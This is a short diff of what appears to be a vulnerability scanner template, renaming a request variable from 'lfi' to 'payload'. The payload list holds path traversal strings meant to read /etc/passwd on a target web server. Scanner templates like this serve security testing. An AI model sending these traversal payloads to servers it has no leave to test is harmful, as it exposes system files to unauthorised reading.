@@ -11,10 +11,10 @@ info:
 requests:
   - method: GET
     path:
-        - '{{BaseURL}}{{lfi}}'
+        - '{{BaseURL}}{{payload}}'
 
     payloads:
-       lfi: 
+       payload: 
         - '/etc/passwd'
         - '../../../../../../../../../../../../../../../../../../../../../../etc/passwd'
         - '../../../../../../../../../../../../../../../../../../../../../etc/passwd'
